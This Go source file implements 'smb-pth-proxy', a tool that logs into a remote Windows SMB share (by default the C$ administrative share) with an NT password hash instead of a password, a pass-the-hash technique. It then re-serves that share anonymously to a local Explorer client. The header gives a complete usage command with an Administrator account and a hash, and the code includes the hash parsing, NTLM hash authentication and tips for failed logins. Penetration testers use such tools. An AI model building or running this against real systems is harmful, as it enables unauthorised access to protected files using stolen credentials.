// smb-pth-proxy: browse a remote Windows share with an NT hash, no password.
//
// Architecture:
//   Windows Explorer → [local SMB server (this tool)] → [target, auth via NT hash]
//
// The local server accepts anonymous/guest connections from Explorer.
// The upstream connection authenticates via pass-the-hash.
//
// Hard limits (same as all go-smb PtH tools):
//   - Forces SMB 2.1 upstream. Targets that REQUIRE SMB signing will fail.
//   - Read-only: writes return STATUS_ACCESS_DENIED.
//   - Port 445 needs root / CAP_NET_BIND_SERVICE.
//
// Build:
//   go mod tidy && go build -o smb-pth-proxy .
//
// Usage:
//   sudo ./smb-pth-proxy \
//     -t 10.0.0.5 -u Administrator -d CORP \
//     -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
//     -s C$
//
// Then in Windows Explorer:  \\<this-host>\share
// Or map a drive:            net use Z: \\<this-host>\share

package main

import (
	"context"
	"encoding/hex"
	"errors"
	"flag"
	"io"
	"log"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	srvsvc "github.com/jfjallid/go-smb/dcerpc/mssrvs/server"
	dcesrv "github.com/jfjallid/go-smb/dcerpc/server"
	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/smb/server"
	"github.com/jfjallid/go-smb/spnego"
)

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// filetimeToTime converts a Windows FILETIME (100-ns ticks since 1601-01-01)
// to time.Time. Returns zero when ft == 0.
func filetimeToTime(ft uint64) time.Time {
	if ft == 0 {
		return time.Time{}
	}
	const ftEpochDiff uint64 = 116444736000000000 // 100-ns ticks 1601→1970
	if ft < ftEpochDiff {
		return time.Time{}
	}
	return time.Unix(0, int64((ft-ftEpochDiff)*100)).UTC()
}

// allocSize rounds n up to the nearest 4096-byte allocation unit.
func allocSize(n int64) int64 {
	if n <= 0 {
		return 0
	}
	return ((n-1)/4096 + 1) * 4096
}

// smbBase returns the last backslash-separated component of p.
func smbBase(p string) string {
	p = strings.TrimRight(p, "\\")
	if p == "" {
		return "\\"
	}
	if i := strings.LastIndexByte(p, '\\'); i >= 0 {
		return p[i+1:]
	}
	return p
}

// remotePath strips the leading backslash so the path is suitable for
// go-smb's OpenFileExt / ListDirectory (which expect share-relative paths
// without a leading separator).
func remotePath(p string) string {
	return strings.TrimLeft(p, "\\")
}

// errToStatus maps a go-smb error to its NTSTATUS uint32 by walking
// errors.Is against the package-level StatusMap.
func errToStatus(err error) uint32 {
	if err == nil {
		return 0
	}
	for code, sentinel := range smb.StatusMap {
		if errors.Is(err, sentinel) {
			return code
		}
	}
	return smb.StatusObjectNameNotFound
}

// sharedFileAttrs reconstructs FILE_ATTRIBUTE_* bits from smb.SharedFile's
// boolean fields (the library decomposes them on parse; we recompose for
// server.FileInfo).
func sharedFileAttrs(sf smb.SharedFile) uint32 {
	var a uint32
	if sf.IsDir {
		a |= server.FileAttributeDirectory
	} else {
		a |= server.FileAttributeNormal
	}
	if sf.IsHidden {
		a |= server.FileAttributeHidden
	}
	if sf.IsReadOnly {
		a |= server.FileAttributeReadonly
	}
	if sf.IsJunction {
		a |= 0x00000400 // FILE_ATTRIBUTE_REPARSE_POINT (not in server pkg constants)
	}
	return a
}

// fixTime returns t, or now if t is the zero value.
func fixTime(t, now time.Time) time.Time {
	if t.IsZero() {
		return now
	}
	return t
}

// sharedFileToDirEntry converts a smb.SharedFile to a server.DirEntry.
func sharedFileToDirEntry(sf smb.SharedFile) server.DirEntry {
	now := time.Now()
	return server.DirEntry{
		FileInfo: server.FileInfo{
			Name:           sf.Name,
			Size:           int64(sf.Size),
			AllocationSize: allocSize(int64(sf.Size)),
			Attributes:     sharedFileAttrs(sf),
			CreationTime:   fixTime(filetimeToTime(sf.CreationTime), now),
			LastAccessTime: fixTime(filetimeToTime(sf.LastAccessTime), now),
			LastWriteTime:  fixTime(filetimeToTime(sf.LastWriteTime), now),
			ChangeTime:     fixTime(filetimeToTime(sf.ChangeTime), now),
		},
	}
}

// ---------------------------------------------------------------------------
// proxyHandle — implements server.Handle
//
// Each SMB CREATE from Explorer produces one proxyHandle.  It holds the
// upstream *smb.File plus the cached FileInfo the server uses for metadata
// responses (QueryFileInfo, QueryDirectory entries, etc.).
//
// For directory handles we also carry a lazy listing cursor so the server
// can call QueryDirectory repeatedly until STATUS_NO_MORE_FILES.
//
// Root-directory opens are special: the upstream share root cannot always
// be opened as a file object, so we synthesise a synthetic handle for it
// and drive listings via conn.ListDirectory instead of file.QueryDirectory.
// ---------------------------------------------------------------------------

type proxyHandle struct {
	info  server.FileInfo
	path  server.Path
	isDir bool
	file  *smb.File // nil for the synthetic root handle

	// isRoot is true for the share-root synthetic handle.
	isRoot bool

	// Directory listing cursor (populated lazily; protected by mu).
	mu          sync.Mutex
	entries     []server.DirEntry
	pos         int
	listed      bool
	lastPattern string
}

func (h *proxyHandle) Stat() (server.FileInfo, error) { return h.info, nil }
func (h *proxyHandle) Path() server.Path              { return h.path }
func (h *proxyHandle) IsDir() bool                    { return h.isDir }

// ---------------------------------------------------------------------------
// proxyVFS — implements server.VFS
// ---------------------------------------------------------------------------

type proxyVFS struct {
	up    *smb.Connection
	share string
}

// openOpts builds CreateReqOpts for opening a file or directory read-only.
func openDirOpts() *smb.CreateReqOpts {
	o := smb.NewCreateReqOpts()
	o.DesiredAccess = smb.DAccMaskFileListDirectory |
		smb.DAccMaskFileReadAttributes |
		smb.DAccMaskReadControl |
		smb.DAccMaskSynchronize
	o.CreateOpts = smb.FileDirectoryFile
	o.ShareAccess = smb.FileShareRead | smb.FileShareWrite | smb.FileShareDelete
	o.CreateDisp = smb.FileOpen
	return o
}

func openFileOpts() *smb.CreateReqOpts {
	o := smb.NewCreateReqOpts() // read data + attrs + control + sync
	o.ShareAccess = smb.FileShareRead | smb.FileShareWrite
	o.CreateDisp = smb.FileOpen
	return o
}

// syntheticRootHandle builds the handle returned for the share root (\).
// We don't open anything upstream here; listings go through ListDirectory.
func syntheticRootHandle(shareName string) *proxyHandle {
	now := time.Now()
	return &proxyHandle{
		info: server.FileInfo{
			Name:           shareName,
			Size:           0,
			AllocationSize: 0,
			Attributes:     server.FileAttributeDirectory,
			CreationTime:   now,
			LastAccessTime: now,
			LastWriteTime:  now,
			ChangeTime:     now,
		},
		path:   "\\",
		isDir:  true,
		isRoot: true,
		file:   nil,
	}
}

// handleFromFile builds a proxyHandle from an already-opened upstream *smb.File.
func handleFromFile(req server.CreateRequest, f *smb.File, shareName string) *proxyHandle {
	now := time.Now()
	attrs := f.Attributes
	if attrs == 0 {
		if f.IsDir() {
			attrs = server.FileAttributeDirectory
		} else {
			attrs = server.FileAttributeNormal
		}
	}
	name := smbBase(req.Path)
	if name == "\\" || name == "" {
		name = shareName
	}
	return &proxyHandle{
		info: server.FileInfo{
			Name:           name,
			Size:           int64(f.EndOfFile),
			AllocationSize: allocSize(int64(f.EndOfFile)),
			Attributes:     attrs,
			CreationTime:   fixTime(filetimeToTime(f.CreationTime), now),
			LastAccessTime: fixTime(filetimeToTime(f.LastAccessTime), now),
			LastWriteTime:  fixTime(filetimeToTime(f.LastWriteTime), now),
			ChangeTime:     fixTime(filetimeToTime(f.ChangeTime), now),
		},
		path:  req.Path,
		isDir: f.IsDir(),
		file:  f,
	}
}

// Create opens the requested path on the upstream target and returns a handle.
func (v *proxyVFS) Create(ctx context.Context, _ *server.Session, req server.CreateRequest) (server.CreateResult, uint32, error) {
	remote := remotePath(req.Path) // share-relative, no leading "\"

	// ---- Root directory ----
	// The share root ("\") is special: some targets reject a bare-path CREATE
	// with FILE_DIRECTORY_FILE, so we always return a synthetic handle for it.
	if remote == "" {
		h := syntheticRootHandle(v.share)
		return server.CreateResult{
			Handle:       h,
			CreateAction: smb.FileOpened,
			Info:         h.info,
		}, 0, nil
	}

	// ---- Determine whether Explorer wants a dir or a file ----
	wantsDir := (req.CreateOptions&smb.FileDirectoryFile) != 0 ||
		(req.FileAttributes&smb.FileAttrDirectory) != 0

	// ---- Try to open upstream ----
	var (
		upFile *smb.File
		err    error
	)
	if wantsDir {
		// First attempt: with FILE_DIRECTORY_FILE.
		upFile, err = v.up.OpenFileExt(v.share, remote, openDirOpts())
		if err != nil {
			// Retry without that flag (some servers dislike it).
			o := openDirOpts()
			o.CreateOpts = 0
			upFile, err = v.up.OpenFileExt(v.share, remote, o)
		}
	} else {
		upFile, err = v.up.OpenFileExt(v.share, remote, openFileOpts())
		if err != nil {
			// Explorer sometimes opens files with directory opts first; try
			// the other way around as a fallback.
			upFile, err = v.up.OpenFileExt(v.share, remote, openDirOpts())
		}
	}
	if err != nil {
		return server.CreateResult{}, errToStatus(err), nil
	}

	h := handleFromFile(req, upFile, v.share)
	return server.CreateResult{
		Handle:       h,
		CreateAction: smb.FileOpened,
		Info:         h.info,
	}, 0, nil
}

// Close releases the upstream file handle.
func (v *proxyVFS) Close(_ context.Context, h server.Handle) error {
	ph := h.(*proxyHandle)
	if ph.file != nil {
		_ = ph.file.CloseFile()
		ph.file = nil
	}
	return nil
}

// Read forwards a positional read to the upstream file.
func (v *proxyVFS) Read(_ context.Context, h server.Handle, offset int64, buf []byte) (int, uint32, error) {
	ph := h.(*proxyHandle)
	if ph.file == nil {
		if ph.isRoot {
			return 0, smb.StatusAccessDenied, nil
		}
		return 0, smb.StatusFileClosed, nil
	}
	n, err := ph.file.ReadFile(buf, uint64(offset))
	if err != nil {
		// ReadFile returns io.EOF (not an NTStatus error) when the upstream
		// server sends STATUS_END_OF_FILE. Treat both forms as end-of-file.
		// Returning n=0 with StatusOk is equivalent — the server's read
		// handler sends STATUS_END_OF_FILE to the client when n==0.
		if errors.Is(err, io.EOF) || errors.Is(err, smb.StatusMap[smb.StatusEndOfFile]) {
			return 0, smb.StatusEndOfFile, nil
		}
		return 0, errToStatus(err), nil
	}
	return n, 0, nil
}

// Write: read-only proxy; all mutations are rejected.
func (v *proxyVFS) Write(_ context.Context, _ server.Handle, _ int64, _ []byte) (int, uint32, error) {
	return 0, smb.StatusAccessDenied, nil
}

// Flush: no-op for a read-only proxy.
func (v *proxyVFS) Flush(_ context.Context, _ server.Handle) (uint32, error) {
	return 0, nil
}

// QueryDirectory lists the remote directory.
//
// Strategy: on restart=true (or first call) we fetch ALL matching entries
// from upstream in one shot and store them in the handle.  Subsequent calls
// with restart=false drain the cursor; once empty we return STATUS_NO_MORE_FILES.
// The server handles PDU-level pagination (fitting entries into response buffers)
// without needing to call us again.
//
// Root handle: uses conn.ListDirectory because there is no upstream File to
// call QueryDirectory on.
// Non-root handle: uses file.QueryDirectory directly on the open upstream file.
func (v *proxyVFS) QueryDirectory(_ context.Context, h server.Handle, pattern string, restart bool) ([]server.DirEntry, uint32, error) {
	ph := h.(*proxyHandle)
	ph.mu.Lock()
	defer ph.mu.Unlock()

	if pattern == "" {
		pattern = "*"
	}

	// Reset cursor when the server requests a fresh scan or the pattern changed.
	if restart || !ph.listed || pattern != ph.lastPattern {
		var raw []smb.SharedFile
		var err error

		if ph.isRoot {
			// ListDirectory requires the tree to be already connected —
			// it does NOT call TreeConnect internally (unlike OpenFileExt).
			// Call it here; it's idempotent when the tree is already up.
			if tcErr := v.up.TreeConnect(v.share); tcErr != nil {
				return nil, errToStatus(tcErr), nil
			}
			// Root: list the top level of the share.
			raw, err = v.up.ListDirectory(v.share, "", pattern)
		} else {
			if ph.file == nil {
				return nil, smb.StatusFileClosed, nil
			}
			var flags byte
			if restart {
				flags = smb.RestartScans
			}
			raw, err = ph.file.QueryDirectory(pattern, flags, 0, 65536)
		}

		if err != nil {
			if errors.Is(err, smb.StatusMap[smb.StatusNoMoreFiles]) {
				ph.listed = true
				ph.lastPattern = pattern
				ph.entries = nil
				ph.pos = 0
				return nil, smb.StatusNoMoreFiles, nil
			}
			return nil, errToStatus(err), nil
		}

		entries := make([]server.DirEntry, len(raw))
		for i, sf := range raw {
			entries[i] = sharedFileToDirEntry(sf)
		}
		ph.entries = entries
		ph.pos = 0
		ph.listed = true
		ph.lastPattern = pattern
	}

	if ph.pos >= len(ph.entries) {
		return nil, smb.StatusNoMoreFiles, nil
	}

	// Return all remaining entries; the server handles buffer-splitting.
	result := ph.entries[ph.pos:]
	ph.pos = len(ph.entries)
	return result, 0, nil
}

// QueryFileInfo returns StatusNotSupported so the server falls back to its own
// Stat()-driven serialization (serializeFileInfo). Returning StatusOk with a
// nil value causes "unrecognized info type <nil>" — the server only accepts
// []byte from the VFS, so nil with StatusOk is always wrong.
func (v *proxyVFS) QueryFileInfo(_ context.Context, _ server.Handle, _ byte) (any, uint32, error) {
	return nil, smb.StatusNotSupported, nil
}

// SetFileInfo: read-only proxy; reject all mutations.
func (v *proxyVFS) SetFileInfo(_ context.Context, _ server.Handle, _ byte, _ []byte) (uint32, error) {
	return smb.StatusAccessDenied, nil
}

// QueryFSInfo returns StatusNotSupported so the server uses its own defaultFsInfo
// (synthetic 16TB NTFS volume with half free). Same reasoning as QueryFileInfo.
func (v *proxyVFS) QueryFSInfo(_ context.Context, _ byte) (any, uint32, error) {
	return nil, smb.StatusNotSupported, nil
}

// QuerySecurity returns StatusNotSupported so the server substitutes its own
// world-readable security descriptor (Owner=Group=Everyone, no DACL/SACL).
func (v *proxyVFS) QuerySecurity(_ context.Context, _ server.Handle, _ uint32) ([]byte, uint32, error) {
	return nil, smb.StatusNotSupported, nil
}

// Ioctl: not implemented; the server returns STATUS_NOT_SUPPORTED.
func (v *proxyVFS) Ioctl(_ context.Context, _ server.Handle, _ uint32, _ []byte, _ uint32) ([]byte, uint32, error) {
	return nil, smb.StatusNotSupported, nil
}

// ---------------------------------------------------------------------------
// Upstream connection
// ---------------------------------------------------------------------------

// openUpstream dials the target and authenticates with the NT hash (PtH).
// hashArg accepts either:
//   - 32 hex chars (NT hash only):        "8846f7eaee8fb117ad06bdd830b7586c"
//   - LMHASH:NTHASH (impacket-style):     "aad3...04ee:8846...86c"
func openUpstream(target, user, domain, hashArg string) (*smb.Connection, error) {
	ntHex := hashArg
	if idx := strings.LastIndexByte(hashArg, ':'); idx >= 0 {
		ntHex = hashArg[idx+1:]
	}
	hashBytes, err := hex.DecodeString(ntHex)
	if err != nil {
		return nil, err
	}
	if len(hashBytes) != 16 {
		return nil, errors.New("NT hash must be exactly 16 bytes (32 hex chars)")
	}
	return smb.NewConnection(smb.Options{
		Host: target,
		Port: 445,
		// SMB 2.1: required for the PtH path; later dialects need extra signing
		// context negotiation that can block hash-only auth on some targets.
		Dialects: append([]uint16{}, smb.DialectsSMB2Only...),
		Initiator: &spnego.NTLMInitiator{
			User:   user,
			Domain: domain,
			Hash:   hashBytes,
		},
	})
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

func main() {
	target := flag.String("t", "", "target SMB host IP or name (required)")
	user := flag.String("u", "", "username on target (required)")
	domain := flag.String("d", ".", "domain or workgroup ('.' = local account)")
	hashArg := flag.String("H", "", "NT hash: 32 hex OR lmhash:nthash (required)")
	share := flag.String("s", "C$", "remote share to proxy (default: C$)")
	listen := flag.String("l", "0.0.0.0:445", "local listen addr:port (port 445 needs root)")
	localShare := flag.String("share-name", "share", "share name exposed locally (\\\\host\\<this>)")
	flag.Parse()

	if *target == "" || *user == "" || *hashArg == "" {
		flag.Usage()
		log.Fatal("\nflags -t, -u and -H are required")
	}

	// ---- Open upstream pass-the-hash connection ----
	log.Printf("[*] connecting to \\\\%s\\%s as %s\\%s via hash...", *target, *share, *domain, *user)
	up, err := openUpstream(*target, *user, *domain, *hashArg)
	if err != nil {
		log.Fatalf("[!] upstream PtH connect failed: %v\n"+
			"    STATUS_LOGON_FAILURE   → wrong hash\n"+
			"    STATUS_ACCESS_DENIED   → wrong hash or account restrictions\n"+
			"    'signing required'     → target mandates SMB signing; PtH won't work", err)
	}
	defer up.Close()
	log.Printf("[+] upstream authenticated as %s\\%s", *domain, *user)

	// ---- Wire the proxy VFS ----
	vfs := &proxyVFS{up: up, share: *share}

	cfg := &server.ServerConfig{
		NetBIOSName: "SMBPROXY",
		// Pin to SMB 2.1 on both the upstream and downstream legs.
		// This eliminates SMB 3.x features (signing contexts, encryption,
		// FSCTL_VALIDATE_NEGOTIATE_INFO, leases) that the Linux kernel CIFS
		// client triggers and that we don't fully implement.
		// The Linux mount client should be told the same: -o vers=2.1
		MinDialect: smb.DialectSmb_2_1,
		MaxDialect: smb.DialectSmb_2_1,
		// Accept any downstream connection without credentials so Explorer /
		// mount.cifs connects without a password prompt.
		// To require a local password, replace these with a MapAuthenticator.
		AllowAnonymous: true,
		AllowGuest:     true,
	}

	srv := &server.Server{Config: cfg}

	// ---- Register the proxied disk share ----
	srv.RegisterShare(*localShare, server.Share{
		Name: *localShare,
		Type: smb.ShareTypeDisk,
		VFS:  vfs,
		// FILE_ALL_ACCESS — Explorer uses MaximalAccess to enable UI affordances
		// (copy, paste, delete buttons). The VFS still enforces read-only.
		MaximalAccess: 0x001f01ff,
	})

	// ---- Wire srvsvc so Explorer can enumerate shares at \\host level ----
	// Without this, direct UNC paths (\\host\share) still work but the host-
	// level share list and "net view \\host" fail.
	shareEntries := srvsvc.FromConfig(cfg)
	svc := &srvsvc.Service{Shares: shareEntries}
	cfg.PipeOpener = &server.MapPipeOpener{
		Pipes: map[string]func(*server.Session) (server.PipeBackend, error){
			"srvsvc": func(_ *server.Session) (server.PipeBackend, error) {
				return dcesrv.NewPipeHandler("srvsvc", svc), nil
			},
		},
	}

	log.Printf("[*] SMB proxy listening on %s", *listen)
	log.Printf("[*] Connect from Explorer:  \\\\<this-host>\\%s", *localShare)
	log.Printf("[*] Or map a drive:         net use Z: \\\\<this-host>\\%s", *localShare)

	// ---- Graceful shutdown on Ctrl-C / SIGTERM ----
	go func() {
		quit := make(chan os.Signal, 1)
		signal.Notify(quit, os.Interrupt, syscall.SIGTERM)
		<-quit
		log.Println("[*] shutting down...")
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = srv.Shutdown(ctx)
	}()

	if err := srv.ListenAndServe(*listen); err != nil && !errors.Is(err, server.ErrServerClosed) {
		log.Fatalf("[!] server error: %v", err)
	}
}
